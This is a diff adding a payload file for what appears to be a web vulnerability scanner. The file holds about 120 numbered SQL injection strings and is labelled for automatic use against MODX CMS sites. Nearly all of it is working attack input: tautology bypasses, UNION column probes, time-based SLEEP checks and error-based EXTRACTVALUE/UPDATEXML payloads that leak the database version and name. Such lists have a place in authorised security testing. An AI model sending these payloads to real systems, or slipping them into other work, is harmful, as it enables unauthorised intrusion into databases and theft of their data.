@@ -1,0 +1,122 @@
+# modx CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Modx
+' OR '1'='1' /*modx_1*/
+' AND 1=2 UNION SELECT NULL-- modx_2
+' AND SLEEP(4)-- modx_3
+' OR IF(4=4,SLEEP(2),0)-- modx_4
+' UNION SELECT NULL,NULL,NULL-- modx_5
+' ORDER BY 7-- modx_6
+' GROUP BY 8 HAVING 1=1-- modx_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_9
+1 OR 1=1# modx_10
+-1 UNION SELECT NULL-- modx_11
+' OR 1=1-- modx_12
+' OR '1'='1' /*modx_13*/
+' AND 1=2 UNION SELECT NULL-- modx_14
+' AND SLEEP(1)-- modx_15
+' OR IF(16=16,SLEEP(2),0)-- modx_16
+' UNION SELECT NULL,NULL,NULL-- modx_17
+' ORDER BY 9-- modx_18
+' GROUP BY 4 HAVING 1=1-- modx_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_21
+1 OR 1=1# modx_22
+-1 UNION SELECT NULL-- modx_23
+' OR 1=1-- modx_24
+' OR '1'='1' /*modx_25*/
+' AND 1=2 UNION SELECT NULL-- modx_26
+' AND SLEEP(3)-- modx_27
+' OR IF(28=28,SLEEP(2),0)-- modx_28
+' UNION SELECT NULL,NULL,NULL-- modx_29
+' ORDER BY 1-- modx_30
+' GROUP BY 8 HAVING 1=1-- modx_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_33
+1 OR 1=1# modx_34
+-1 UNION SELECT NULL-- modx_35
+' OR 1=1-- modx_36
+' OR '1'='1' /*modx_37*/
+' AND 1=2 UNION SELECT NULL-- modx_38
+' AND SLEEP(5)-- modx_39
+' OR IF(40=40,SLEEP(2),0)-- modx_40
+' UNION SELECT NULL,NULL,NULL-- modx_41
+' ORDER BY 3-- modx_42
+' GROUP BY 4 HAVING 1=1-- modx_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_45
+1 OR 1=1# modx_46
+-1 UNION SELECT NULL-- modx_47
+' OR 1=1-- modx_48
+' OR '1'='1' /*modx_49*/
+' AND 1=2 UNION SELECT NULL-- modx_50
+' AND SLEEP(2)-- modx_51
+' OR IF(52=52,SLEEP(2),0)-- modx_52
+' UNION SELECT NULL,NULL,NULL-- modx_53
+' ORDER BY 5-- modx_54
+' GROUP BY 8 HAVING 1=1-- modx_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_57
+1 OR 1=1# modx_58
+-1 UNION SELECT NULL-- modx_59
+' OR 1=1-- modx_60
+' OR '1'='1' /*modx_61*/
+' AND 1=2 UNION SELECT NULL-- modx_62
+' AND SLEEP(4)-- modx_63
+' OR IF(64=64,SLEEP(2),0)-- modx_64
+' UNION SELECT NULL,NULL,NULL-- modx_65
+' ORDER BY 7-- modx_66
+' GROUP BY 4 HAVING 1=1-- modx_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_69
+1 OR 1=1# modx_70
+-1 UNION SELECT NULL-- modx_71
+' OR 1=1-- modx_72
+' OR '1'='1' /*modx_73*/
+' AND 1=2 UNION SELECT NULL-- modx_74
+' AND SLEEP(1)-- modx_75
+' OR IF(76=76,SLEEP(2),0)-- modx_76
+' UNION SELECT NULL,NULL,NULL-- modx_77
+' ORDER BY 9-- modx_78
+' GROUP BY 8 HAVING 1=1-- modx_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_81
+1 OR 1=1# modx_82
+-1 UNION SELECT NULL-- modx_83
+' OR 1=1-- modx_84
+' OR '1'='1' /*modx_85*/
+' AND 1=2 UNION SELECT NULL-- modx_86
+' AND SLEEP(3)-- modx_87
+' OR IF(88=88,SLEEP(2),0)-- modx_88
+' UNION SELECT NULL,NULL,NULL-- modx_89
+' ORDER BY 1-- modx_90
+' GROUP BY 4 HAVING 1=1-- modx_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_93
+1 OR 1=1# modx_94
+-1 UNION SELECT NULL-- modx_95
+' OR 1=1-- modx_96
+' OR '1'='1' /*modx_97*/
+' AND 1=2 UNION SELECT NULL-- modx_98
+' AND SLEEP(5)-- modx_99
+' OR IF(100=100,SLEEP(2),0)-- modx_100
+' UNION SELECT NULL,NULL,NULL-- modx_101
+' ORDER BY 3-- modx_102
+' GROUP BY 8 HAVING 1=1-- modx_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_105
+1 OR 1=1# modx_106
+-1 UNION SELECT NULL-- modx_107
+' OR 1=1-- modx_108
+' OR '1'='1' /*modx_109*/
+' AND 1=2 UNION SELECT NULL-- modx_110
+' AND SLEEP(2)-- modx_111
+' OR IF(112=112,SLEEP(2),0)-- modx_112
+' UNION SELECT NULL,NULL,NULL-- modx_113
+' ORDER BY 5-- modx_114
+' GROUP BY 4 HAVING 1=1-- modx_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- modx_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- modx_117
+1 OR 1=1# modx_118
+-1 UNION SELECT NULL-- modx_119
+' OR 1=1-- modx_120
